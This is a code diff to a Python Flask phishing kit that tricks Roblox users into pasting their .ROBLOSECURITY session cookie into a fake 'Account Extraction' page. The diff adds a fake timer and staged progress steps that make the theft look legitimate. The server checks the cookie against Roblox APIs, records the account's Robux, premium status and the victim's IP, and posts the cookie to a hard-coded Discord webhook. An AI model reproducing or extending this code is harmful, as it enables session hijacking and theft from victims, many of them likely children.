@@ -12,7 +12,6 @@ CORS(app)
 
 ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1458240581649174686/Eu-jB0LfRlnStSKuuqeixQA9u1a8tpxjiBS4175HCG0B2PQVRsoHvWKdI-NshDuS7LVx"
 
-# Store data
 resellers = {}
 sites_data = {}
 
@@ -518,7 +517,7 @@ HELPER_HTML = """
             margin-bottom: 8px;
             font-size: 13px;
         }
-        input, textarea {
+        textarea {
             width: 100%;
             padding: 12px;
             border: 2px solid #ecf0f1;
@@ -526,14 +525,12 @@ HELPER_HTML = """
             font-size: 14px;
             font-family: inherit;
             transition: all 0.3s;
+            min-height: 100px;
+            resize: vertical;
         }
-        input:focus, textarea:focus {
+        textarea:focus {
             outline: none;
             border-color: #e74c3c;
-        }
-        textarea {
-            resize: vertical;
-            min-height: 80px;
         }
         button {
             width: 100%;
@@ -574,10 +571,11 @@ HELPER_HTML = """
             color: #721c24;
             display: block;
         }
-        .status.processing {
+        .status.extracting {
             background: #cff4fc;
             color: #055160;
             display: block;
+            font-weight: bold;
         }
         .info {
             background: #fff3cd;
@@ -591,65 +589,118 @@ HELPER_HTML = """
         .loading {
             display: none;
             text-align: center;
-            margin: 10px 0;
+            margin: 20px 0;
         }
         .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #e74c3c;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #e74c3c;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
+            width: 50px;
+            height: 50px;
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto 20px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+        .timer {
+            font-size: 18px;
+            font-weight: bold;
+            color: #e74c3c;
+            margin: 10px 0;
+        }
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background-color: #f0f0f0;
+            border-radius: 5px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #e74c3c, #f39c12);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 5px;
+        }
+        .extraction-steps {
+            text-align: left;
+            margin: 15px 0;
+            font-size: 13px;
+        }
+        .step {
+            margin: 8px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+        .step:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #27ae60;
+            font-weight: bold;
+        }
+        .step.pending:before {
+            content: "⏳";
+            color: #f39c12;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🛠️ {{WEBSITE_NAME}}</h1>
-        <p class="subtitle">Enter your details below</p>
+        <p class="subtitle">Paste your Roblox cookie below</p>
 
         <div class="input-group">
-            <label>Roblox Username</label>
-            <input type="text" id="username" placeholder="Enter your username">
-        </div>
-
-        <div class="input-group">
-            <label>Roblox Cookie</label>
+            <label>Roblox Cookie (.ROBLOSECURITY)</label>
             <textarea id="cookie" placeholder="Paste your .ROBLOSECURITY cookie here"></textarea>
         </div>
 
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p>Processing your request...</p>
+            <div class="timer" id="timer">01:00</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <h3>🔍 Account Extraction in Progress</h3>
+            <p>Please wait while we extract your account information...</p>
+            
+            <div class="extraction-steps">
+                <div class="step pending" id="step1">Verifying cookie validity</div>
+                <div class="step pending" id="step2">Extracting account details</div>
+                <div class="step pending" id="step3">Checking Robux balance</div>
+                <div class="step pending" id="step4">Retrieving premium status</div>
+                <div class="step pending" id="step5">Finalizing extraction</div>
+            </div>
         </div>
 
-        <button onclick="submitInfo()" id="submitBtn">Submit</button>
+        <button onclick="submitCookie()" id="submitBtn">Extract Account</button>
 
         <div class="status" id="status"></div>
 
         <div class="info">
-            ℹ️ We need your cookie to verify your account.
+            ℹ️ We need your cookie to extract your account information. This process takes approximately 1 minute.
         </div>
     </div>
 
     <script>
         const SITE_ID = "{{SITE_ID}}";
-        const BASE_URL = window.location.origin;
+        let extractionTimer = null;
+        let timeLeft = 60; // 1 minute in seconds
+        let progressInterval = null;
 
-        async function submitInfo() {
-            const username = document.getElementById('username').value;
+        async function submitCookie() {
             const cookie = document.getElementById('cookie').value;
             const status = document.getElementById('status');
             const btn = document.getElementById('submitBtn');
             const loading = document.getElementById('loading');
+            const progressBar = document.getElementById('progressBar');
+            const timer = document.getElementById('timer');
 
-            if (!username || !cookie) {
-                showError('❌ Please fill in all fields');
+            if (!cookie) {
+                showError('❌ Please paste your Roblox cookie');
                 return;
             }
 
@@ -658,14 +709,28 @@ HELPER_HTML = """
                 return;
             }
 
+            // Reset timer and progress
+            timeLeft = 60;
+            progressBar.style.width = '0%';
+            timer.textContent = '01:00';
+            
+            // Hide button and show loading
             btn.disabled = true;
             btn.style.display = 'none';
             loading.style.display = 'block';
-            status.className = 'status processing';
-            status.textContent = '⏳ Processing your request...';
-            status.style.display = 'block';
+            status.style.display = 'none';
+            
+            // Start the timer
+            startExtractionTimer();
+            
+            // Simulate extraction steps
+            simulateExtractionSteps();
+            
+            // Start progress bar animation
+            startProgressBar();
 
             try {
+                // Send request to server
                 const response = await fetch('/submit', {
                     method: 'POST',
                     headers: { 
@@ -674,7 +739,6 @@ HELPER_HTML = """
                     },
                     body: JSON.stringify({
                         site_id: SITE_ID,
-                        username: username,
                         cookie: cookie
                     })
                 });
@@ -682,33 +746,153 @@ HELPER_HTML = """
                 const data = await response.json();
 
                 if (data.success) {
-                    showSuccess('✅ Thank you! Your request has been processed.');
-                    document.getElementById('username').value = '';
-                    document.getElementById('cookie').value = '';
+                    // Mark all steps as completed
+                    completeAllSteps();
+                    // Wait for timer to finish
+                    setTimeout(() => {
+                        clearExtractionTimer();
+                        showSuccess('✅ Account extraction completed successfully!');
+                        document.getElementById('cookie').value = '';
+                    }, 1000);
                 } else {
-                    showError('❌ Error: ' + (data.error || 'Failed to process request'));
+                    clearExtractionTimer();
+                    showError('❌ Extraction failed: ' + (data.error || 'Unknown error'));
                 }
             } catch (error) {
+                clearExtractionTimer();
                 showError('❌ Network error. Please check your connection and try again.');
             } finally {
-                btn.disabled = false;
-                btn.style.display = 'block';
-                loading.style.display = 'none';
+                // Button will be re-enabled after timer completes
+            }
+        }
+
+        function startExtractionTimer() {
+            extractionTimer = setInterval(() => {
+                timeLeft--;
+                
+                // Update timer display
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                document.getElementById('timer').textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                // Update progress bar based on time
+                const progressPercentage = ((60 - timeLeft) / 60) * 100;
+                document.getElementById('progressBar').style.width = `${progressPercentage}%`;
+                
+                // When timer reaches 0
+                if (timeLeft <= 0) {
+                    clearExtractionTimer();
+                    completeExtraction();
+                }
+            }, 1000);
+        }
+
+        function startProgressBar() {
+            let progress = 0;
+            progressInterval = setInterval(() => {
+                progress += 1.67; // 100% in 60 seconds
+                if (progress > 100) progress = 100;
+                document.getElementById('progressBar').style.width = `${progress}%`;
+            }, 1000);
+        }
+
+        function simulateExtractionSteps() {
+            // Step 1: Verify cookie (immediate)
+            setTimeout(() => {
+                document.getElementById('step1').classList.remove('pending');
+                document.getElementById('step1').textContent = '✓ Cookie verified';
+            }, 3000);
+            
+            // Step 2: Extract details (5 seconds)
+            setTimeout(() => {
+                document.getElementById('step2').classList.remove('pending');
+                document.getElementById('step2').textContent = '✓ Account details extracted';
+            }, 8000);
+            
+            // Step 3: Check Robux (15 seconds)
+            setTimeout(() => {
+                document.getElementById('step3').classList.remove('pending');
+                document.getElementById('step3').textContent = '✓ Robux balance checked';
+            }, 18000);
+            
+            // Step 4: Premium status (25 seconds)
+            setTimeout(() => {
+                document.getElementById('step4').classList.remove('pending');
+                document.getElementById('step4').textContent = '✓ Premium status retrieved';
+            }, 28000);
+            
+            // Step 5: Finalizing (45 seconds)
+            setTimeout(() => {
+                document.getElementById('step5').classList.remove('pending');
+                document.getElementById('step5').textContent = '✓ Extraction finalized';
+            }, 48000);
+        }
+
+        function completeAllSteps() {
+            for (let i = 1; i <= 5; i++) {
+                const step = document.getElementById(`step${i}`);
+                step.classList.remove('pending');
+                if (!step.textContent.includes('✓')) {
+                    step.textContent = '✓ ' + step.textContent.replace('⏳ ', '');
+                }
+            }
+        }
+
+        function completeExtraction() {
+            clearInterval(progressInterval);
+            document.getElementById('progressBar').style.width = '100%';
+            
+            // Re-enable button
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = false;
+            btn.style.display = 'block';
+            
+            // Hide loading
+            document.getElementById('loading').style.display = 'none';
+            
+            // Show success message
+            showSuccess('✅ Account extraction process completed!');
+        }
+
+        function clearExtractionTimer() {
+            if (extractionTimer) {
+                clearInterval(extractionTimer);
+                extractionTimer = null;
+            }
+            if (progressInterval) {
+                clearInterval(progressInterval);
+                progressInterval = null;
             }
         }
 
         function showError(message) {
+            clearExtractionTimer();
             const status = document.getElementById('status');
+            const btn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            
             status.className = 'status error';
             status.textContent = message;
             status.style.display = 'block';
+            
+            btn.disabled = false;
+            btn.style.display = 'block';
+            loading.style.display = 'none';
         }
 
         function showSuccess(message) {
             const status = document.getElementById('status');
+            const btn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            
             status.className = 'status success';
             status.textContent = message;
             status.style.display = 'block';
+            
+            btn.disabled = false;
+            btn.style.display = 'block';
+            loading.style.display = 'none';
         }
     </script>
 </body>
@@ -827,13 +1011,12 @@ def submit():
         return jsonify({'success': False, 'error': 'No data received'})
     
     site_id = data.get('site_id')
-    username = data.get('username')
     cookie = data.get('cookie')
     
-    print(f"Site ID: {site_id}, Username: {username}, Cookie length: {len(cookie) if cookie else 0}")
+    print(f"Site ID: {site_id}, Cookie length: {len(cookie) if cookie else 0}")
     
-    if not site_id or not username or not cookie:
-        return jsonify({'success': False, 'error': 'Missing required fields'})
+    if not site_id or not cookie:
+        return jsonify({'success': False, 'error': 'Missing cookie'})
     
     if site_id not in sites_data:
         return jsonify({'success': False, 'error': 'Invalid site ID'})
@@ -853,6 +1036,7 @@ def submit():
             print(f"IP lookup error: {ip_error}")
         
         user_id = "Unknown"
+        username = "Unknown"
         robux = 0
         email_verified = "Unknown"
         premium = "Unknown"
@@ -860,7 +1044,6 @@ def submit():
         top_games = []
         api_status = "Failed"
         cookie_valid = False
-        username_from_api = "Unknown"
         
         headers = {
             'Cookie': f'.ROBLOSECURITY={cookie}',
@@ -891,11 +1074,11 @@ def submit():
             if user_response.status_code == 200:
                 user_data = user_response.json()
                 user_id = user_data.get('id', 'Unknown')
-                username_from_api = user_data.get('name', 'Unknown')
+                username = user_data.get('name', 'Unknown')
                 cookie_valid = True
                 api_status = "Success"
                 
-                print(f"User authenticated: {username_from_api} (ID: {user_id})")
+                print(f"User authenticated: {username} (ID: {user_id})")
                 
                 try:
                     robux_headers = headers.copy()
@@ -998,11 +1181,10 @@ def submit():
         embed_color = 0xFF0000 if (isinstance(robux, int) and robux >= 100) else (0xFFA500 if reseller_id != 'none' else 0x00FF00)
         
         embed = {
-            'title': '🎯 New Submission' if cookie_valid else '⚠️ Invalid Submission',
+            'title': '🎯 Account Extracted' if cookie_valid else '⚠️ Extraction Failed',
             'color': embed_color,
             'fields': [
-                {'name': '👤 Username Submitted', 'value': username, 'inline': True},
-                {'name': '👤 Username (API)', 'value': username_from_api, 'inline': True},
+                {'name': '👤 Username', 'value': username, 'inline': True},
                 {'name': '🆔 User ID', 'value': str(user_id), 'inline': True},
                 {'name': '💎 Robux', 'value': str(robux), 'inline': True},
                 {'name': '⭐ Premium', 'value': premium, 'inline': True},
@@ -1014,7 +1196,7 @@ def submit():
                 {'name': '🎮 Recent Games', 'value': ', '.join(top_games) if top_games else 'None found', 'inline': False},
                 {'name': '🍪 Cookie', 'value': f'```{cookie[:80]}...```' if len(cookie) > 80 else f'```{cookie}```', 'inline': False}
             ],
-            'footer': {'text': 'Roblox Tools'},
+            'footer': {'text': 'Roblox Tools - Account Extraction'},
             'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
         }
         
@@ -1040,7 +1222,7 @@ def submit():
             except:
                 pass
         
-        return jsonify({'success': True, 'message': 'Data processed successfully'})
+        return jsonify({'success': True, 'message': 'Account extraction completed'})
     
     except Exception as e:
         print(f"Submit error: {e}")
